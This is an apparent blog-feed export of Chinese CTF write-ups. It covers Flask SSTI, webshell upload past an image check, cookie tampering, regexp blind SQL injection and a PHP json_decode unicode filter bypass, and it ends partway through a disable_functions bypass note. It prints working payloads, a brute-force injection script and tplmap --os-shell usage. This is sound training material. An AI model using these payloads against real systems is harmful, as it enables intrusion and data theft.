        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首发于吾爱破解，现转到博客上来。</p><p>不知道该分哪类，姑且放到逆向里吧</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在7.5版本下一些函数如<code>PatchByte()</code>，<code>Byte()</code>都提示<br>NameError: name ‘Byte’ is not defined<br>又舍不得放弃7.5(一些题目拿7.5版生成的伪代码比7.0版要好看的多)，<br>于是在网上查了很久，找出了解决办法。</p><p>原来是IDApython的api问题<br>首先是官方对于api的详细迁移文档<br><a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml</a><br>有了这个表，一些wp里的旧版代码搜索一下就能在7.5版使用了。</p><p>以下是兼容办法</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>其次是在比较方便的在7.5用7.0API办法，来源：<a href="https://github.com/0xgalz/Virtuailor/issues/8">https://github.com/0xgalz/Virtuailor/issues/8</a><br>在代码面前加个：<br><code>from idc_bc695 import *</code><br>即可。</p><h3 id="方法2-一劳永逸版-："><a href="#方法2-一劳永逸版-：" class="headerlink" title="方法2(一劳永逸版)："></a>方法2(一劳永逸版)：</h3><p>来源官方文档：<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695.shtml">https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695.shtml</a><br>找到</p><ul><li>~/.idapro/cfg/idapython.cfg (Linux)</li><li>%APPDATA%\Hex-Rays\IDA Pro\cfg\idapython.cfg (Windows) (绿色版的话在程序目录下那个cfg文件夹里)</li></ul><p>把<code>AUTOIMPORT_COMPAT_IDA695</code>的值改为<code>YES</code></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 华东南赛区]Double Secret</title>
      <link href="/p/1231048582.html"/>
      <url>/p/1231048582.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[rc4|ssti|flask]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211302124.png" alt="image-20210720211302124"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>就是靠灵光一闪</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211632653.png" alt="image-20210720211632653"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211704135.png" alt="image-20210720211704135"></p><p>buu上的题最近不知道为啥，浏览器里敲连接必触发dns rebind attack检测，真的烦</p><p>输到12345的时候报错了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211917580.png" alt="image-20210720211917580"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212233582.png" alt="image-20210720212233582"></p><p>rc4算法，密钥HereIsTreasure</p><p>试试?secret=a,结果为4，试了网上好几个在线rc4加密的，<a href="http://tool.chacuo.net/cryptrc4%E5%B0%B1%E8%BF%99%E4%B8%AA%E7%BB%93%E6%9E%9C%E4%B8%80%E8%87%B4">http://tool.chacuo.net/cryptrc4就这个结果一致</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212708801.png" alt="image-20210720212708801"></p><p>果然。</p><p>flask+template，怀疑是ssti</p><p>蛮怪的，明明是加密，注释又写个解密。</p><p>那大概就是检测加密字符输出解密，检测未加密字符输出加密。</p><p>查文件</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在flag.txt里</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720221827489.png" alt="image-20210720221827489"></p><p>于是读/flag.txt</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接打肯定是不行的，需要先rc4加密，加密后有很多不可视字符，所以再urlencode一下</p><p>注意把<code>encode all special chars</code>点上，不然#等字符不会被urlencode，get传值就出问题了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720222043615.png" alt="image-20210720222043615"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RootersCTF2019]I_&lt;3_Flask</title>
      <link href="/p/2417191136.html"/>
      <url>/p/2417191136.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[flask|ssti]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720181727848.png" alt="image-20210720181727848"></p><p>可见flask，盲猜一手ssti</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>粗略看了一圈，没发现什么，扫扫目录试试</p><p>扫了一圈没发现啥，照着SSTI路子走吧。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720182835086.png" alt="image-20210720182835086"></p><p>得，还真是</p><p>也可以拿arjun跑一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185121498.png" alt="image-20210720185121498"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720183120837.png" alt="image-20210720183120837"></p><p>直接跑tplmap吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python2 tplmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>adce423c<span class="token operator">-</span><span class="token number">3166</span><span class="token operator">-</span><span class="token number">4725</span><span class="token operator">-</span>b1ae<span class="token operator">-</span>eb79b910f76a<span class="token punctuation">.</span>node4<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>?name<span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意要么用双引号，要么不加引号，单引号会报这个错误，估计类似于PHP那种单引号当纯字符串，双引号才能解析的情况</p><pre class="line-numbers language-none"><code class="language-none">[!][tplmap] Exiting: No connection adapters were found for<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185825391.png" alt="image-20210720185825391"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python2 tplmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>adce423c<span class="token operator">-</span><span class="token number">3166</span><span class="token operator">-</span><span class="token number">4725</span><span class="token operator">-</span>b1ae<span class="token operator">-</span>eb79b910f76a<span class="token punctuation">.</span>node4<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>?name<span class="token operator">=</span><span class="token number">123</span> <span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">-</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185902746.png" alt="image-20210720185902746"></p><p>结束</p><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://portswigger.net/research/server-side-template-injection">Server-Side Template Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[WUSTCTF2020]CV Maker</title>
      <link href="/p/233234935.html"/>
      <url>/p/233234935.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719175410526.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看到这种站挺吓人的，随便点了点大多都是死界面，还好。</p><p>先尝试性的扫一下，没扫到什么信息泄漏。</p><p>注册用户，还报错了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180218415.png"></p><p>登录，有个头像上传，先试试。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180554597.png"></p><p>看来用了exif_imagetype函数限制了，加个文件幻数可绕过。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180648510.png" alt="image-20210719180648510"></p><p>试了试，没想到对上传后缀没限制</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719204736684.png"></p><p>直接就传上去了，蚁剑连接下，查看根目录flag，结束。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719204750659.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[watevrCTF-2019]Cookie Store</title>
      <link href="/p/268857083.html"/>
      <url>/p/268857083.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719171957875.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>配合题目名，大概就知道是从cookie入手。</p><p>需要把price改到100然后购买这个。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719172150122.png" alt="image-20210719172150122"></p><p>买了几次，发现cookie在变化，一看cookie</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719174338184.png"></p><p>base64字符串，解密下</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"money"</span><span class="token operator">:</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token property">"history"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"Yummy chocolate chip cookie"</span><span class="token punctuation">,</span> <span class="token string">"Yummy chocolate chip cookie"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那没啥好说的了，改下，再base64加密，用editethiscookie改下cookie，刷新再购买，结束。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719174515659.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> Cookies </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NCTF2019]SQLi</title>
      <link href="/p/2489403193.html"/>
      <url>/p/2489403193.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[%00|regexp|sql注入regexp]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718163621816.png" alt="image-20210718163621816"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>首先先fuzz一下，检测如下字符</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718164754285.png" alt="image-20210718164754285"></p><p>这过滤的也太全了。</p><p>试了试不太行。找找看有没有其他线索</p><p>打开<code>/robots.txt</code>，里面有提示<code>/hint.txt</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718165858952.png" alt="image-20210718165858952"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718171656156.png" alt="image-20210718171656156"></p><h3 id="00截断要点"><a href="#00截断要点" class="headerlink" title="%00截断要点"></a>%00截断要点</h3><blockquote><p>php&lt;5.3.4,且magic_quotes_gpc==off可进行%00截断</p></blockquote><p><code>%00</code>不能在浏览器中打，会被编码成%2500</p><p>在很老的burpsuite版本中中需要转到hex改00</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718173258923.png" alt="image-20210718173258923"></p><p>刚试了下2020.6版可以直接打%00,</p><p>2021版直接就把hex栏给取消了,不过可以直接打。<br>python中传<code>%00</code>不能直接传，需要</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseparse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>postman里直接打<code>%2500</code>就好</p><hr><p>在此测试下%00截断,payload:</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;\&amp;passwd&#x3D;||1;%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若是成功会有个302重定向，说明可行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718173354834.png" alt="image-20210718173354834"></p><h3 id="利用regexp查值"><a href="#利用regexp查值" class="headerlink" title="利用regexp查值"></a>利用regexp查值</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718191412562.png"></p><p>默认不区分大小写。</p><p>先快速跑一下，看看回显</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718191648591.png" alt="image-20210718191648591"></p><p>然后跑脚本吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurl <span class="token operator">=</span> <span class="token string">'http://6c177fcd-3eaf-4520-9cab-fd073e403007.node4.buuoj.cn/'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># 26个字母+数字+一些符号，小心通配符</span>s <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_&#123;&#125;'</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">while</span><span class="token punctuation">(</span>result <span class="token operator">!=</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    last <span class="token operator">=</span> result    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"||(passwd)regexp(\"^&#123;&#125;\");&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>result<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>            <span class="token string">"passwd"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">503</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Too fast'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">b'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            result <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]'</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出</p><pre class="line-numbers language-none"><code class="language-none">you_will_never_know7788990<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>账号随便输，密码就这个，登陆下，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HarekazeCTF2019]encode_and_encode</title>
      <link href="/p/2319372040.html"/>
      <url>/p/2319372040.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[json|unicode]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token string single-quoted-string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>首先看<code>php://input</code>，而非<code>$_GET</code>,<code>$_POST</code>,<code>$_REQUEST</code>，所以不会进行urldecode，发什么包就是什么包。</p><p>源码的最后有个将flag给替换的操作，明显是不能明文读取，需要加密一下。</p><pre class="line-numbers language-none"><code class="language-none">$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意看代码，是<code>is_valid($body)</code>，也就是说检测的是json字符串，而<code>file_get_contents()</code>读取的是json解码后的字符。</p><p>可见问题就出在这，思路就是<code>$body</code>检测原字符通过，json解码字符读取flag。</p><p>所以搜搜看<code>json_decode()</code>可得</p><blockquote><p><code>json_decode()</code>会自动解析unicode字符</p></blockquote><p>所以可以用unicode编码绕过正则</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，需用burpsuite或其他办法发包，浏览器不可</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> json_decode() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>disable_functions bypass</title>
      <link href="/p/3790227649.html"/>
      <url>/p/3790227649.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>具体原理会贴连接，此文主要是记录下基本操作，便于日后做题。</p><h3 id="命令不可执行原因"><a href="#命令不可执行原因" class="headerlink" title="命令不可执行原因"></a>命令不可执行原因</h3><blockquote><p>通常来说，导致 webshell 不能执行命令的原因大概有三类：</p><p>1.php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</p><p>2.web 进程运行在 rbash 这类受限 shell 环境中；</p><p>3.WAF拦截。若是一则无法执行任何命令，若是二、三则可以执行少量命令。</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ul><li><p>disable_functions的四种bypass法</p><blockquote><p>1.攻击后端组件，寻找存在命令注入的、web应用常用的后端组件，如，ImageMagick的魔图漏洞、bash的破壳漏洞；</p><p>2.寻找未禁用的漏网函数，常见的执行命令的函数有system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；</p><p>3.mod_cgi 模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制；</p><p>4.利用环境变量LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p></blockquote></li></ul><p>在此记录下bypass的一般操作</p><h3 id="攻击后端组件"><a href="#攻击后端组件" class="headerlink" title="攻击后端组件"></a>攻击后端组件</h3><p>在phpinfo()中查看组件版本，例如<code>ImageMagick</code></p><p>然后用<code>searchsploit</code>搜索相关poc并加以利用。</p><p><img src="/../images/disable-functions-bypass/image-20210717172227637.png"></p><p>TODO：找个例题实际操作下</p><hr><h3 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h3><blockquote><p>设想这样一种思路：利用漏洞控制web启动新进程a.bin即便进程名无法让我随意指定),a.bin内部调用系统函数b()，b()位于系统共享对象c.so中，所以系统为该进程加载共c.so，我想法在c.so前优先加载可控的c_evil.so，c_evil.so内含与 